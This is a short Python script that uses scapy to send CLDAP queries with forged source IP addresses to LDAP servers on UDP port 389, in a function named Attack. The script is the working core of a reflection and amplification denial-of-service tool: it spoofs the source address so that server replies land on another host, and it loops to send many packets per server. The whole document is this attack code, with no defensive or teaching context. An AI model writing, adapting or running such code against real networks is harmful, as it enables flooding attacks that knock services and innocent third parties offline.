from scapy.all import IP, UDP, send, Raw
from faker import Faker
import random

fake = Faker()
cldap_servers = ["10.0.0.1", "10.0.0.2"]

cldap_query = b'\x30\x1a\x02\x01\x01\x63\x15\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x30\x00'

def Attack(requestPerServer):
    src_ip = fake.ipv4()
    for server in cldap_servers:
        ip = IP(src=src_ip, dst=server)
        for i in range(requestPerServer):
            src_port = random.randint(1024, 65535)
            udp = UDP(sport=src_port, dport=389)
            packet = ip/udp/Raw(load=cldap_query)
            send(packet, verbose=False)
            print(f"Sent {i+1} CLDAP request to {server}")